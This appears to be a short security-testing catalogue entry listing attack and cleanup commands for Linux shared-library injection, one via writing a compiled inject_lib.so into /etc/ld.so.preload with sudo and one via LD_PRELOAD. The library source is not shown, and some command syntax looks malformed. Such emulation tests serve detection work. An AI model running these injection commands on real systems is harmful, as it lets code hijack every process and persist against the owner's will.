gcc -shared -fPIC ./inject_lib.c -o inject_lib.so -ldl  
  
1. Shared Library Injection via /etc/ld.so.preload  
Attack Commands:  
sudo sh -c 'echo /tmp/inject_lib.so > /etc/ld.so.preload'  
Cleanup Commands:  
sudo sed -i 's##/tmp/inject_lib.so##' /etc/ld.so.preload  
  
2. Shared Library Injection via LD_PRELOAD  
Attack Commands:  
LD_PRELOAD=#/tmp/inject_lib.so ls  
